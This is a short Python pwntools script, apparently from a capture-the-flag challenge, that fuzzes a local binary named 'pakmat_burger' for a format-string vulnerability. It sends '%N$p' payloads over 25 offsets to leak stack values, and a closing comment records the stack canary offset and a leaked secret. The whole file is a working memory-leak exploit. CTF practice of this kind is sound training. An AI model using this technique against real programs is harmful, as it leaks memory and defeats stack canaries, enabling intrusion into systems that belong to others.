from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./pakmat_burger', checksec=False)


os.environ["SECRET_MESSAGE"] = "YOKO"

# Let's fuzz 25 values
for i in range(1,25):
    try:
        p = process(level='error')
        p.sendlineafter(b': ', '%{}$p'.format(i).encode())
        result = p.recv().split(b' ')
        result = result[1].split(b',')
        leak_char = result[0].ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass

'''
canary @ %13$s
secret message = 8d7e88a8
'''